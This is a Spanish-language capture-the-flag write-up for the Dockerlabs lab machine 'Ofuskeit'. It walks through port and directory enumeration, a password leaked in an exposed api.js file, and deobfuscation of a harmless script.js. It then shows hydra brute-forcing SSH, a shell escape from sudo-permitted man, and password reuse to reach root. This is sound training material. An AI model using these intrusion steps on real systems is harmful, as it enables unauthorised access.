- Tags: #JSOfuscated
# Writeup Template: Maquina `[ Ofuskeit ]`

- Tags: #Ofuskeit
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Ofuskeit](https://mega.nz/file/OUE0nRxZ#9syTboxSbmL8UPr2de6SsdavqMfYhXWFrOBnH7pQWok) Javascript deobfuscation e interacción con una API.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x ofuskeit.zip
sudo bash auto_deploy.sh ofuskeit.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,3000 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
```

Buscando un posible exploit para esta version de apache no encontramos nada:
```bash
searchsploit Apache httpd 2.4.62
```

---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 2129]
/api.js               (Status: 200) [Size: 494]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/script.js            (Status: 200) [Size: 1916]
```
### Credenciales Encontradas
Ingresando a la siguiente ruta tenemos un scirpt:
```bash
http://172.17.0.2/api.js
```

Tenemos este script de js
```js
const express = require('express');
const app = express();
const PORT = 3000;

const tokenValido = "EKL56L4K57657JÃ‘456J74K5Ã‘6754";

app.use(express.json());

app.post('/api', (req, res) => {
  const { token } = req.body;

  if (token === tokenValido) {
    return res.send("âœ… Acceso concedido. ContraseÃ±a chocolate123");
  } else {
    return res.status(401).send("âŒ Token invÃ¡lido.");
  }
});

app.listen(PORT, () => {
  console.log(`ðŸš€ API activa en http://localhost:${PORT}`);
});
```

Tenemos un posible contrasena valida para algun usuario, pero aun no tenemos pista de algun usuario:
```bash
chocolate123
```

Entrando a esta ruta:
```bash
http://172.17.0.2/script.js
```

Tenemos una codigo ofuscado:
```js
const _0x2e969c=_0x5630;function _0x5630(_0x5eee05,_0x5c9b5b){const _0xd47cca=_0xd47c();return _0x5630=function(_0x563033,_0x376d46){_0x563033=_0x563033-0x116;let _0x2db0a5=_0xd47cca[_0x563033];return _0x2db0a5;},_0x5630(_0x5eee05,_0x5c9b5b);}(function(_0x4e504c,_0x521540){const _0x4b7081=_0x5630,_0x4d7bfe=_0x4e504c();while(!![]){try{const _0x2dfcaa=parseInt(_0x4b7081(0x126))/0x1+-parseInt(_0x4b7081(0x117))/0x2+-parseInt(_0x4b7081(0x124))/0x3+parseInt(_0x4b7081(0x123))/0x4+parseInt(_0x4b7081(0x12a))/0x5+-parseInt(_0x4b7081(0x127))/0x6*(parseInt(_0x4b7081(0x128))/0x7)+-parseInt(_0x4b7081(0x125))/0x8*(-parseInt(_0x4b7081(0x11d))/0x9);if(_0x2dfcaa===_0x521540)break;else _0x4d7bfe['push'](_0x4d7bfe['shift']());}catch(_0x3dbf98){_0x4d7bfe['push'](_0x4d7bfe['shift']());}}}(_0xd47c,0xd8ebc),document[_0x2e969c(0x121)](_0x2e969c(0x129),()=>{const _0xfff565=_0x2e969c,_0x2800b1=document[_0xfff565(0x119)]('.card'),_0x2ba20c=new IntersectionObserver(_0x32f825=>{_0x32f825['forEach'](_0x2a4806=>{const _0x7a8fa8=_0x5630;_0x2a4806[_0x7a8fa8(0x120)]&&(_0x2a4806[_0x7a8fa8(0x11f)][_0x7a8fa8(0x122)]['opacity']=0x1,_0x2a4806[_0x7a8fa8(0x11f)][_0x7a8fa8(0x122)][_0x7a8fa8(0x11e)]=_0x7a8fa8(0x116));});},{'threshold':0.3});_0x2800b1[_0xfff565(0x11a)](_0x160bae=>{const _0x10427d=_0xfff565;_0x160bae[_0x10427d(0x122)][_0x10427d(0x12b)]=0x0,_0x160bae[_0x10427d(0x122)]['transform']=_0x10427d(0x11b),_0x160bae[_0x10427d(0x122)]['transition']=_0x10427d(0x11c),_0x2ba20c[_0x10427d(0x118)](_0x160bae);});}));function _0xd47c(){const _0x45eed8=['addEventListener','style','4845208ZWDAiV','2774964FHByBg','272CHxZRB','692528eiKJnh','506922Jnjvgo','28prsaQk','DOMContentLoaded','1602675PgksDG','opacity','translateY(0)','2287094dmVnDS','observe','querySelectorAll','forEach','translateY(30px)','all\x200.6s\x20ease-out','283401KmnzKx','transform','target','isIntersecting'];_0xd47c=function(){return _0x45eed8;};return _0xd47c();}
```

Usaremos este recurso [deofuscate](https://obf-io.deobfuscate.io/) en linea para obtener el codigo correcto en **js**
```js
document.addEventListener("DOMContentLoaded", () => {
  const _0x2800b1 = document.querySelectorAll('.card');
  const _0x2ba20c = new IntersectionObserver(_0x32f825 => {
    _0x32f825.forEach(_0x2a4806 => {
      if (_0x2a4806.isIntersecting) {
        _0x2a4806.target.style.opacity = 0x1;
        _0x2a4806.target.style.transform = "translateY(0)";
      }
    });
  }, {
    'threshold': 0.3
  });
  _0x2800b1.forEach(_0x160bae => {
    _0x160bae.style.opacity = 0x0;
    _0x160bae.style.transform = "translateY(30px)";
    _0x160bae.style.transition = "all 0.6s ease-out";
    _0x2ba20c.observe(_0x160bae);
  });
});
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Viendo que tenemos que apuntar un token valido como vemos en el codigo **js** donde si apuntamos con el token valido nos devuelte una password
Para ver correctamente la api tenemos que apuntar desde curl:
```bash
curl -s -X GET http://172.17.0.2/api.js
```

```js
const express = require('express');
const app = express();
const PORT = 3000;

const tokenValido = "EKL56L4K57657JÑ456J74K5Ñ6754";

app.use(express.json());

app.post('/api', (req, res) => {
  const { token } = req.body;

  if (token === tokenValido) {
    return res.send("✅ Acceso concedido. Contraseña chocolate123");
  } else {
    return res.status(401).send("❌ Token inválido.");
  }
});

app.listen(PORT, () => {
  console.log(`🚀 API activa en http://localhost:${PORT}`);
});
```

### Ejecucion del Ataque
Aunque logramos obtener el **token** valido, no retorna lo esperado
```bash
# Comandos para explotación
curl -s -X POST http://172.17.0.2:3000/api -H 'Content-Type: application/json' -d '{"Token": "EKL56L4K57657JÑ456J74K5Ñ6754"}'
❌ Token inválido.
```

### Intrusion
Pero como ya tenemos una posible password, por lo que realizamos un ataque de fuerza bruta
```bash
hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -p chocolate123 -f -t 4 ssh://172.17.0.2
```

Logrando obtener una session valida por **ssh**
```bash
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: admin   password: chocolate123
```

Logramos ganar acceso:
```bash
# Reverse shell o acceso inicial
ssh admin@172.17.0.2 # ( chocolate123 )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:chocolate,,,:/home/admin:/bin/bash
balulito:x:1001:1001:balulito,,,:/home/balulito:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ Admin ]`:
LIstando los permisos para este usuario tenemos lo siguiente:
```bash
sudo -l

User admin may run the following commands on 8d2813915318:
    (balulito) NOPASSWD: /usr/bin/man
```

Nos aprovechamos de este privilegio para ganar acceso como este usuario:
```bash
sudo -u balulito /usr/bin/man man
!/bin/bash
```

###### Usuario `[ Balulito ]`:
Detectamos que existen reutilizacion de credenciales
```bash
# Comando para escalar al usuario: ( root )
balulito@8d2813915318:/var/www/html$ su root
Password: chocolate123
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@8d2813915318:/var/www/html# whoami
root
```